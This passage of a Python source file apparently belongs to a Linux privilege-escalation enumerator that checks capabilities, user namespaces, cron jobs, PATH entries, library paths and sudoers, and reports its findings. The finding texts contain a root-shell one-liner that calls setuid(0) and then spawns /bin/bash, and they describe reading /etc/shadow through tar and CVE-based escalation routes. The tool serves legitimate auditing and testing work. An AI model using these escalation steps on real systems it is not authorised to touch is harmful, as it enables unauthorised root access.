        if not entry.isdigit():
            continue
        pid = entry
        status_path = f"/proc/{pid}/status"
        try:
            with open(status_path, "r", errors="replace") as fh:
                status_text = fh.read()
        except OSError:
            continue

        name_m = re.search(r"^Name:\s+(\S+)", status_text, re.MULTILINE)
        proc_name = name_m.group(1) if name_m else f"pid:{pid}"

        capeff_m = re.search(r"^CapEff:\s+([0-9a-fA-F]+)", status_text, re.MULTILINE)
        if not capeff_m:
            continue
        try:
            capeff = int(capeff_m.group(1), 16)
        except ValueError:
            continue
        if capeff == 0:
            continue

        for bit, severity, title, description in CAP_CHECKS:
            if capeff & (1 << bit):
                findings.append({
                    "severity": severity,
                    "title": title,
                    "detail": (
                        f"Process '{proc_name}' (pid {pid}) has {title.replace('PROCESS_', '')} "
                        f"set in CapEff (0x{capeff:016x}) — {description}"
                    ),
                    "host": "localhost",
                    "port": 0,
                })

    # --- File capabilities via security.capability xattr ---
    def _parse_file_caps(xattr_bytes: bytes) -> int:
        """Return permitted capability bitmask from a security.capability blob.

        vfs_cap_data layout (kernel capability.h):
          v1  (magic 0x01000000): 12 bytes — magic(4) + permitted(4) + inheritable(4)
          v2  (magic 0x02000000): 20 bytes — magic(4) + [permitted(4)+inheritable(4)]*2
          v3  (magic 0x03000000): 24 bytes — v2 + rootid(4)
        """
        if len(xattr_bytes) < 8:
            return 0
        magic = struct.unpack_from("<I", xattr_bytes, 0)[0]
        rev = (magic >> 24) & 0xFF
        if rev in (2, 3) and len(xattr_bytes) >= 20:
            perm_low  = struct.unpack_from("<I", xattr_bytes, 4)[0]
            perm_high = struct.unpack_from("<I", xattr_bytes, 12)[0]
            return (perm_high << 32) | perm_low
        # v1 — 32-bit only
        if len(xattr_bytes) >= 8:
            return struct.unpack_from("<I", xattr_bytes, 4)[0]
        return 0

    # Interpreters: CAP_SETUID grants root shell without SUID bit
    INTERPRETERS = [
        "/usr/bin/python3", "/usr/bin/python", "/usr/bin/python2",
        "/usr/bin/perl", "/usr/bin/ruby",
    ]
    # Utilities: DAC caps grant arbitrary file read/write
    UTILITIES = [
        "/usr/bin/tar", "/bin/tar",
        "/usr/bin/vim", "/usr/bin/vim.basic",
        "/usr/bin/find", "/bin/find",
    ]

    for path in INTERPRETERS:
        try:
            xattr_bytes = os.getxattr(path, "security.capability")  # type: ignore[attr-defined]
        except (OSError, AttributeError):
            continue
        permitted = _parse_file_caps(xattr_bytes)
        if permitted & (1 << CAP_SETUID):
            findings.append({
                "severity": "CRITICAL",
                "title": "INTERPRETER_WITH_SETUID_CAP",
                "detail": (
                    f"{path} has CAP_SETUID as a file capability (permitted mask "
                    f"0x{permitted:016x}) — an unprivileged user can invoke this "
                    "interpreter and call setuid(0) to obtain a root shell without "
                    "needing the SUID bit; GTFOBins documents the one-liner for each "
                    "interpreter (e.g. python3 -c 'import os; os.setuid(0); "
                    "os.system(\"/bin/bash\")')"
                ),
                "host": "localhost",
                "port": 0,
            })

    for path in UTILITIES:
        try:
            xattr_bytes = os.getxattr(path, "security.capability")  # type: ignore[attr-defined]
        except (OSError, AttributeError):
            continue
        permitted = _parse_file_caps(xattr_bytes)
        has_dac = bool(
            (permitted & (1 << CAP_DAC_READ_SEARCH)) |
            (permitted & (1 << CAP_DAC_OVERRIDE))
        )
        if has_dac:
            findings.append({
                "severity": "HIGH",
                "title": "UTILITY_WITH_DAC_CAP",
                "detail": (
                    f"{path} has CAP_DAC_READ_SEARCH or CAP_DAC_OVERRIDE as a file "
                    f"capability (permitted mask 0x{permitted:016x}) — this utility "
                    "can read or write arbitrary files regardless of permissions; "
                    "combined with a writable PATH or cron vector this becomes a full "
                    "privilege escalation chain (e.g. tar with DAC_READ_SEARCH can "
                    "read /etc/shadow directly)"
                ),
                "host": "localhost",
                "port": 0,
            })

    # --- Unprivileged user namespace policy ---
    try:
        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as fh:
            val = fh.read().strip()
        if val == "1":
            findings.append({
                "severity": "HIGH",
                "title": "UNPRIV_USER_NAMESPACE_ENABLED",
                "detail": (
                    "/proc/sys/kernel/unprivileged_userns_clone = 1 — unprivileged "
                    "user namespace creation is enabled; any unprivileged user can "
                    "create a user namespace in which they appear as UID 0, enabling "
                    "exploitation of namespace-confused kernel vulnerabilities "
                    "(CVE-2022-0847 DirtyPipe, CVE-2023-32233 nftables UAF) and "
                    "container escape chains that rely on namespace privilege "
                    "separation; mitigate with: "
                    "sysctl -w kernel.unprivileged_userns_clone=0"
                ),
                "host": "localhost",
                "port": 0,
            })
    except OSError:
        pass

    return findings


def detect_cron_and_path_hijacking() -> list:
    """Detect cron job and PATH hijacking privilege escalation vectors.

    Checks:
    - Writable cron scripts and world-writable cron directories
    - Relative-path commands in cron job definitions
    - Dangerous PATH entries in /etc/environment and /etc/profile
    - World-writable directories in the current process PATH
    - Writable library directories from ld.so config
    - SUDO env_keep PATH inheritance in sudoers

    Informed by Gray Hat Hacking Ch. 3 (Linux Exploit Development Tools) —
    environment manipulation is the first-tier post-access vector; cron and
    PATH hijacking are the two highest-frequency privilege escalation paths
    in CTF and real-world engagements.
    """
    findings = []

    # --- Build list of cron files to inspect ---
    cron_files = []

    # /etc/crontab
    if os.path.isfile("/etc/crontab"):
        cron_files.append("/etc/crontab")

    # /etc/cron.d/*
    try:
        cron_d = "/etc/cron.d"
        if os.path.isdir(cron_d):
            for name in os.listdir(cron_d):
                p = os.path.join(cron_d, name)
                if os.path.isfile(p):
                    cron_files.append(p)
    except OSError:
        pass

    # /var/spool/cron/crontabs/*
    try:
        spool = "/var/spool/cron/crontabs"
        if os.path.isdir(spool):
            for name in os.listdir(spool):
                p = os.path.join(spool, name)
                if os.path.isfile(p):
                    cron_files.append(p)
    except OSError:
        pass

    # /etc/cron.{hourly,daily,weekly,monthly}/*
    for period in ("hourly", "daily", "weekly", "monthly"):
        period_dir = f"/etc/cron.{period}"
        try:
            if os.path.isdir(period_dir):
                for name in os.listdir(period_dir):
                    p = os.path.join(period_dir, name)
                    if os.path.isfile(p):
                        cron_files.append(p)
        except OSError:
            pass

    # Regex: a cron time spec followed by a command that does NOT begin with /
    # Covers both user crontabs (5 fields) and system crontabs (6 fields with username).
    RE_CRON_RELATIVE = re.compile(
        r"^"
        r"(?:\*|[\d,\-\*/]+)\s+"   # minute
        r"(?:\*|[\d,\-\*/]+)\s+"   # hour
        r"(?:\*|[\d,\-\*/]+)\s+"   # day-of-month
        r"(?:\*|[\d,\-\*/]+)\s+"   # month
        r"(?:\*|[\d,\-\*/]+)"      # day-of-week
        r"(?:\s+\w+)?"             # optional username (system crontab)
        r"\s+([^/\s#\n][^\s#\n]*)",  # command: does NOT start with /
        re.MULTILINE,
    )

    # Regex: cron time spec followed by an absolute-path command
    RE_CRON_ABS = re.compile(
        r"^"
        r"(?:\*|[\d,\-\*/]+)\s+"
        r"(?:\*|[\d,\-\*/]+)\s+"
        r"(?:\*|[\d,\-\*/]+)\s+"
        r"(?:\*|[\d,\-\*/]+)\s+"
        r"(?:\*|[\d,\-\*/]+)"
        r"(?:\s+\w+)?"             # optional username
        r"\s+(/[^\s#\n]+)",        # absolute path command
        re.MULTILINE,
    )

    for cron_file in cron_files:
        try:
            with open(cron_file, "r", errors="replace") as fh:
                content = fh.read()
        except OSError:
            continue

        # Check for relative-path cron commands
        for m in RE_CRON_RELATIVE.finditer(content):
            cmd_tok = m.group(1)
            # Skip shell metacharacters that look like command tokens but aren't binaries
            if cmd_tok.startswith(("%", "@", "*", "#")):
                continue
            findings.append({
                "severity": "HIGH",
                "title": "CRON_RELATIVE_PATH",
                "detail": (
                    f"Cron entry in {cron_file} invokes '{cmd_tok}' as a relative "
                    "path — the binary is resolved against the cron daemon's PATH at "
                    "runtime; if any directory earlier in that PATH is world-writable "
                    "an attacker can plant a malicious binary with the same name and "
                    "have it execute on the cron schedule under the job's owner"
                ),
                "host": "localhost",
                "port": 0,
            })

        # Check absolute-path cron scripts for writability and writable parent dir
        for m in RE_CRON_ABS.finditer(content):
            raw_cmd = m.group(1)
            # Take only the path token, strip shell args and trailing metacharacters
            cmd_path = re.split(r"[\s;&|]", raw_cmd.rstrip(";&|"))[0]
            if not cmd_path or not os.path.isfile(cmd_path):
                continue

            try:
                if os.access(cmd_path, os.W_OK):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "WRITABLE_CRON_SCRIPT",
                        "detail": (
                            f"Cron script {cmd_path} (referenced in {cron_file}) is "
                            "writable by the current user — overwriting this file "
                            "causes arbitrary code to execute on the cron schedule "
                            "under the job owner's privileges (commonly root)"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
            except OSError:
                pass

            try:
                dir_path = os.path.dirname(cmd_path) or "/"
                dir_st = os.stat(dir_path)
                if dir_st.st_mode & stat.S_IWOTH:
                    findings.append({
                        "severity": "HIGH",
                        "title": "WRITABLE_CRON_DIRECTORY",
                        "detail": (
                            f"Directory {dir_path} containing cron script {cmd_path} "
                            f"(from {cron_file}) is world-writable — an attacker can "
                            "place a malicious binary with the same name that will "
                            "execute on the next cron run"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
            except OSError:
                pass

    # --- PATH hijacking: /etc/environment, /etc/profile, /etc/bash.bashrc ---
    PATH_CONFIG_FILES = ["/etc/environment", "/etc/profile", "/etc/bash.bashrc"]
    RE_PATH_DEF = re.compile(r'(?:^|export\s+)PATH\s*=\s*["\']?([^"\'#\n]+)', re.MULTILINE)

    for cfg_file in PATH_CONFIG_FILES:
        try:
            with open(cfg_file, "r", errors="replace") as fh:
                cfg_text = fh.read()
        except OSError:
            continue

        for pm in RE_PATH_DEF.finditer(cfg_text):
            path_value = pm.group(1).strip().rstrip("\"'")
            for d in path_value.split(":"):
                d = d.strip().rstrip("\"' \t")
                if not d:
                    continue
                if d == ".":
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "DANGEROUS_PATH_ENTRY",
                        "detail": (
                            f"{cfg_file} sets PATH containing '.' (current directory) "
                            "— any working directory visited during a privileged "
                            "session becomes an implicit binary search path; an "
                            "attacker who can write to that directory can plant a "
                            "trojan binary that shadows a system command"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
                    continue
                if not d.startswith("/"):
                    continue
                try:
                    d_st = os.stat(d)
                    if d_st.st_mode & stat.S_IWOTH:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "DANGEROUS_PATH_ENTRY",
                            "detail": (
                                f"{cfg_file} PATH includes world-writable directory "
                                f"{d} — any local user can plant a malicious binary "
                                "here that is resolved before the legitimate system "
                                "binary during privileged sessions"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except OSError:
                    pass

    # --- World-writable directories in the current process PATH ---
    path_env = os.environ.get("PATH", "")
    for d in path_env.split(":"):
        d = d.strip()
        if not d:
            continue
        try:
            d_st = os.stat(d)
            if d_st.st_mode & stat.S_IWOTH:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "WRITABLE_PATH_DIRECTORY",
                    "detail": (
                        f"PATH directory {d} is world-writable — any local user can "
                        "plant a malicious binary here that is resolved before the "
                        "legitimate system binary; affects every command run without "
                        "an absolute path by any user whose PATH includes this "
                        "directory"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
        except OSError:
            pass

    # --- ld.so library path writability ---
    ld_conf_files = []
    ld_so_conf = "/etc/ld.so.conf"
    if os.path.isfile(ld_so_conf):
        ld_conf_files.append(ld_so_conf)
    ld_conf_d = "/etc/ld.so.conf.d"
    if os.path.isdir(ld_conf_d):
        try:
            for name in os.listdir(ld_conf_d):
                if name.endswith(".conf"):
                    ld_conf_files.append(os.path.join(ld_conf_d, name))
        except OSError:
            pass

    lib_dirs_seen: set = set()
    for conf_file in ld_conf_files:
        try:
            with open(conf_file, "r", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith(("#", "include")):
                        continue
                    if line.startswith("/"):
                        lib_dirs_seen.add(line)
        except OSError:
            continue

    for lib_dir in lib_dirs_seen:
        try:
            d_st = os.stat(lib_dir)
            if d_st.st_mode & stat.S_IWOTH:
                findings.append({
                    "severity": "HIGH",
                    "title": "WRITABLE_LIBRARY_PATH",
                    "detail": (
                        f"Shared library directory {lib_dir} (from ld.so config) is "
                        "world-writable — an attacker can plant a malicious shared "
                        "library here that is preloaded into any dynamically linked "
                        "binary including SUID binaries that have not dropped "
                        "LD_LIBRARY_PATH; a library with the right soname will be "
                        "loaded transparently at exec time"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
        except OSError:
            pass

    # --- SUDO env_keep PATH inheritance ---
    sudoers_paths = ["/etc/sudoers"]
    sudoers_d = "/etc/sudoers.d"
    if os.path.isdir(sudoers_d):
        try:
            for name in os.listdir(sudoers_d):
                p = os.path.join(sudoers_d, name)
                if os.path.isfile(p) and not name.endswith("~"):
                    sudoers_paths.append(p)
        except OSError:
            pass

    RE_ENVKEEP_PATH = re.compile(r"env_keep\s*\+?=.*\bPATH\b", re.IGNORECASE)

    for sudoers_file in sudoers_paths:
        try:
            with open(sudoers_file, "r", errors="replace") as fh:
                sudoers_text = fh.read()
        except OSError:
            continue
        if RE_ENVKEEP_PATH.search(sudoers_text):
            findings.append({
                "severity": "HIGH",
                "title": "SUDO_INHERITS_PATH",
                "detail": (
                    f"{sudoers_file} contains env_keep += PATH — the calling user's "
                    "PATH variable is preserved when running sudo; if the user "
                    "controls a writable directory that appears earlier in their PATH "
                    "than the intended binary they can shadow any command invoked "
                    "via sudo without an absolute path, achieving privilege escalation"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


if __name__ == '__main__':
    enum = PrivescEnumerator()
    enum.enumerate_all()
    print(enum.report())
